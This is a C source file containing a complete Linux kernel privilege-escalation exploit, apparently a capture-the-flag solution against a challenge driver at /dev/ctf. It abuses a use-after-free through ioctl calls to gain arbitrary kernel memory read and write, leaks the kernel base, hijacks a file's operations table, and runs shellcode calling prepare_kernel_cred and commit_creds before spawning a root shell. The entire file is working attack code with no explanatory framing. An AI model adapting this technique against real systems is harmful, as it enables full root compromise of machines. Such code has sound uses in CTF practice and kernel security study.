#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>


#define CTF_ALLOC 1337
#define CTF_FREE  1338

#if 0
// Debug
#define INIT_USER_NS 0x144d240
#define PREPARE_KERNEL_CREDS 0xb3050
#define COMMIT_CREDS 0xb2e20
#define SET_MEMORY_X 0x777b0
#else
// Target
#define INIT_USER_NS 0x144c020
#define PREPARE_KERNEL_CREDS 0x8c2f0
#define COMMIT_CREDS 0x8c0c0
#define SET_MEMORY_X 0x5b0d0
#endif

struct ctf_data {
  char *mem;
  size_t size;
};

uint64_t buf[0x10000000/8];
uint64_t * tmp = buf;

int main(int argc, char *argv[])
{
    int32_t fd1, fd2, fd3;
    struct ctf_data d1, d2;
    uint64_t target, filp;
    uint64_t old_filp[0x100];

    puts("");

    // Open the first ctf fd
    fd1 = open("/dev/ctf", O_RDWR);

    // Allocate and free the space for the second ctf fd
    ioctl(fd1, CTF_ALLOC, sizeof(struct ctf_data));
    ioctl(fd1, CTF_FREE);

    // Reallocate that memory with fd2's ctf_data
    // Such that fd1->mem = fd2.ctf_data
    fd2 = open("/dev/ctf", O_RDWR);
    ioctl(fd2, CTF_ALLOC, sizeof(struct ctf_data));
    ioctl(fd2, CTF_FREE);

    fd3 = open("/dev/ctf", O_RDWR);
    ioctl(fd3, CTF_ALLOC, 2000);

    // Read the pointer to fd2's private data
    read(fd1, &d1, sizeof(struct ctf_data));
    read(fd2, &d2, sizeof(struct ctf_data));

    // Check the realloc succeeded
    if (d1.size != 0x10) {
        puts("Setup failed");
        return -1;
    }

    // Now scan memory for the pointer to find fd2 file struct
    target = (uint64_t) d1.mem;
    printf("target:             %#lx\n", target);
    d1.mem = (char*) ((uint64_t) d1.mem & 0xfffffffff0000000);
    d1.size = 0x10000000;
    if (write(fd1, &d1, sizeof(struct ctf_data)) < 0) {
        return -2;
    }
    if (read(fd2, tmp, d1.size) < 0) {
        return -3;
    }

    printf("target:             %#lx\n", target);
    printf("starting search at: %p\n", d1.mem);
    printf("ending search at:   %p\n", d1.mem+d1.size);
    for (uint64_t i=0; i < (d1.size / 8); i++) {
        uint64_t val = *(tmp + i);
        if (target == val && (uint8_t)(uint64_t)(d1.mem+i*8) == 0xc8) {
            printf("found at:           %p\n", d1.mem + i*8);
            filp = (uint64_t) d1.mem + i*8 - 0xc8;
            break;
        }
    }

    d1.mem = (char *) filp;
    d1.size = 0x30;
    tmp[2] = 0;
    if (write(fd1, &d1, sizeof(struct ctf_data)) < 0) { return -4; }
    if (read(fd2, tmp, d1.size) < 0) { return -5; }
    printf("dentry:             %#lx\n", tmp[2]);
    d1.mem = (char *) tmp[2];
    d1.size = 0x20;
    uint64_t f_op = tmp[5];
    if (write(fd1, &d1, sizeof(struct ctf_data)) < 0) { return -4; }
    if (read(fd2, tmp, d1.size) < 0) { return -5; }

    uint64_t init_user_ns = tmp[3];
    printf("init_user_ns:       %#lx\n", init_user_ns);
    uint64_t kernel_base = init_user_ns - INIT_USER_NS;
    printf("kernel_base         %#lx\n", kernel_base);
    printf("f_op:               %#lx\n", f_op);

    // Read the filp of fd3
    d1.mem = (char *) filp;
    d1.size = sizeof(old_filp);
    if (write(fd1, &d1, sizeof(struct ctf_data)) < 0) { return -4; }
    if (read(fd2, tmp, d1.size) < 0) { return -5; }

    // Change the f_op
    memcpy(old_filp, tmp, sizeof(old_filp));
    tmp[5] = (uint64_t) d2.mem;

    // Writeback the new f_op
    if (write(fd2, tmp, d1.size) < 0) { return -4; }

    // Read the old f_op
    d1.mem = (char *) f_op;
    d1.size = 256;
    if (write(fd1, &d1, sizeof(struct ctf_data)) < 0) { return -4; }
    if (read(fd2, tmp, d1.size) < 0) { return -5; }

    // Change the read ptr
    tmp[2] = kernel_base + SET_MEMORY_X;  // read
    tmp[3] = filp + 0x100;                // write

    // Write the new f_op
    d1.mem = (char *) d2.mem;
    d1.size = 256;
    if (write(fd1, &d1, sizeof(struct ctf_data)) < 0) { return -4; }
    if (write(fd2, tmp, d1.size) < 0) { return -5; }

    // Make filp +x
    read(fd3, (char *)1, 1);

    // Write shellcode at filp
    uint64_t prep = kernel_base + PREPARE_KERNEL_CREDS;
    uint64_t comm = kernel_base + COMMIT_CREDS;

    char shellcode[] = {
        /* xor rdi, rdi */    0x48, 0x31, 0xff,
        /* movabs rsi, ... */ 0x48, 0xbe, 0, 0, 0, 0, 0, 0, 0, 0,
        /* call rsi */        0xff, 0xd6,
        /* movabs rsi, ... */ 0x48, 0xbe, 0, 0, 0, 0, 0, 0, 0, 0,
        /* call rsi */        0xff, 0xd6,
        /* ret */             0xc3,
    };
    memcpy(&shellcode[5],  (char*)&prep, sizeof(uint64_t));
    memcpy(&shellcode[17], (char*)&comm, sizeof(uint64_t));

    // Write the shellcode to memory
    d1.mem = (char *) filp + 0x100;
    d1.size = sizeof(shellcode);
    if (write(fd1, &d1, sizeof(struct ctf_data)) < 0) { return -4; }
    if (write(fd2, shellcode, d1.size) < 0) { return -5; }

    // Call the shellcode
    write(fd3, (char *)1, 1);

    // Restore filp
    d1.mem = (char *) filp;
    d1.size = sizeof(old_filp);
    if (write(fd1, &d1, sizeof(struct ctf_data)) < 0) { return -4; }
    if (write(fd2, old_filp, d1.size) < 0) { return -5; }

    // Win
    printf("uid: %d\n", getuid());
    execl("/bin/sh", "/bin/sh", NULL);

    return 0;
}
